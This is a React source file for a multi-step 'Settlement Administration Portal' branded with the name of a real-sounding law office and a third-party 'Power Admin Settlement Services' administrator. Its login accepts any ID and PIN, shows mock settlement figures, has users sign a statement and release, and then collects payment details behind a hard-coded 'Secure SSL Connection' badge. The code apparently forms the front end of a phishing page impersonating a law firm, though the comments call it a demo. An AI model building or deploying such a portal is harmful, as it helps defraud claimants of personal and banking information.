import React, { useState, useEffect } from 'react';
import { ShieldCheck, Lock, Landmark } from 'lucide-react';
import { Step, UserData, PaymentDetails } from './types';
import Login from './components/Login';
import Statement from './components/Statement';
import Release from './components/Release';
import Payment from './components/Payment';
import Success from './components/Success';
import StateSelection from './components/StateSelection';

const App: React.FC = () => {
  const [currentStep, setCurrentStep] = useState<Step>('login');
  
  // Mock User Data State - In a real app, this would come from an API after login
  const [userData, setUserData] = useState<UserData | null>(null);
  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails | null>(null);

  // Scroll to top on step change
  useEffect(() => {
    window.scrollTo(0, 0);
  }, [currentStep]);

  const handleLogin = (id: string, pin: string) => {
    // Simulate API verification
    // For demo purposes, we accept any input but pre-fill mock data
    setUserData({
      uniqueId: id,
      pin: pin,
      firstName: "Jane",
      lastName: "Doe",
      settlementAmount: 1500.00,
      attorneyFees: 500.00,
      adminFees: 50.00,
      netAmount: 950.00
    });
    // Go to State Selection instead of straight to Statement
    setCurrentStep('state-selection');
  };

  const handleStateSelected = (state: string) => {
    // In a real app, you might save this state selection to the backend here
    console.log("User selected state:", state);
    setCurrentStep('statement');
  };

  const handleStatementSigned = () => {
    setCurrentStep('release');
  };

  const handleReleaseSigned = () => {
    setCurrentStep('payment');
  };

  const handlePaymentSubmitted = (details: PaymentDetails) => {
    setPaymentDetails(details);
    setCurrentStep('success');
  };

  // Helper to determine progress bar width
  const getProgressWidth = () => {
    switch (currentStep) {
      case 'state-selection': return 'w-1/4';
      case 'statement': return 'w-1/2';
      case 'release': return 'w-3/4';
      case 'payment': return 'w-full';
      default: return 'w-0';
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-slate-50 font-sans">
      {/* Global Header */}
      <header className="bg-white border-b border-slate-200 shadow-sm sticky top-0 z-50">
        <div className="max-w-2xl mx-auto px-4 py-4 flex flex-col items-center justify-center text-center">
          <div className="mb-2">
            {/* Logo Placeholder - Using an Icon for now */}
            <div className="w-12 h-12 bg-brand-blue text-white rounded-lg flex items-center justify-center mx-auto mb-2 shadow-md">
              <span className="font-serif text-2xl font-bold">J</span>
            </div>
          </div>
          <h1 className="text-xl md:text-2xl font-serif font-bold text-brand-blue tracking-tight">
            THE LAW OFFICES OF <br className="hidden sm:block" />
            <span className="text-slate-800">JIBRAEL S. HINDI</span>
          </h1>
          <p className="text-xs text-slate-500 uppercase tracking-widest mt-1">Settlement Administration Portal</p>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-grow flex flex-col items-center justify-start pt-6 pb-12 px-4">
        <div className="w-full max-w-lg bg-white rounded-xl shadow-xl overflow-hidden border border-slate-100">
          
          {/* Progress Bar (Visual indicator) */}
          {currentStep !== 'login' && currentStep !== 'success' && (
            <div className="bg-slate-100 h-2 w-full flex">
              <div className={`h-full bg-brand-blue transition-all duration-500 ${getProgressWidth()}`}></div>
            </div>
          )}

          <div className="p-6 md:p-8">
            {currentStep === 'login' && <Login onLogin={handleLogin} />}
            
            {currentStep === 'state-selection' && (
              <StateSelection onNext={handleStateSelected} />
            )}

            {currentStep === 'statement' && userData && (
              <Statement user={userData} onNext={handleStatementSigned} />
            )}
            
            {currentStep === 'release' && userData && (
              <Release user={userData} onNext={handleReleaseSigned} onBack={() => setCurrentStep('statement')} />
            )}
            
            {currentStep === 'payment' && userData && (
              <Payment user={userData} onSubmit={handlePaymentSubmitted} onBack={() => setCurrentStep('release')} />
            )}
            
            {currentStep === 'success' && userData && paymentDetails && (
              <Success user={userData} payment={paymentDetails} />
            )}
          </div>
        </div>

        {/* Footer info */}
        <div className="mt-8 text-center text-slate-400 text-xs max-w-md">
            <div className="flex justify-center items-center gap-2 mb-2">
                <Lock className="w-3 h-3" />
                <span>Secure SSL Connection</span>
            </div>
            <p>&copy; {new Date().getFullYear()} Power Admin Settlement Services.</p>
            <p className="mt-1">Authorized Administrator for Jibrael S. Hindi Law.</p>
        </div>
      </main>
    </div>
  );
};

export default App;